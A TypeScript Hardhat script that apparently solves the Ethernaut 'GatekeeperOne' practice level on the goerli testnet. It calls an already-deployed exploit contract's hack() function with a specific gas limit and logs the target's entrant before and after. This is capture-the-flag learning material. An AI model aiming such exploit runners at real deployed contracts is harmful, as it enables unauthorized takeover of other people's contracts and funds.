import { GATEKEEPERONE, GATEKEEPERONEEXPLOIT } from "../constants"
import { ethers, network } from "hardhat"
import { GateKeeperExploit, GatekeeperOne } from "../typechain-types"
import { developmentChains, networkConfig } from "../helper-hardhat-config"

const gateKeeperExploit = async () => {
    if (network.name != "goerli") {
        throw "invalid network. change network to goerli"
    }

    const exploit: GateKeeperExploit = await ethers.getContractAt(
        "GateKeeperExploit",
        GATEKEEPERONEEXPLOIT
    )

    const gatekeeper: GatekeeperOne = await ethers.getContractAt("GatekeeperOne", GATEKEEPERONE)
    const accounts = await ethers.getSigners()
    const exploiter = accounts[0]
    console.log("entrant in gatekeeper before exploit", await gatekeeper.entrant())
    const gas = 802929
    const tx = await exploit
        .connect(exploiter)
        .hack({ gasLimit: ethers.utils.parseUnits(`${gas}`, "wei") })

    await tx.wait()

    console.log("address of exploiter", exploiter.address)
    console.log("entrant in gatekeeper after exploit", await gatekeeper.entrant())
}

gateKeeperExploit()
    .then(() => {
        console.log("gatekeeper exploit successful")
        process.exit(0)
    })
    .catch((e) => {
        console.log(e)
        process.exit(1)
    })
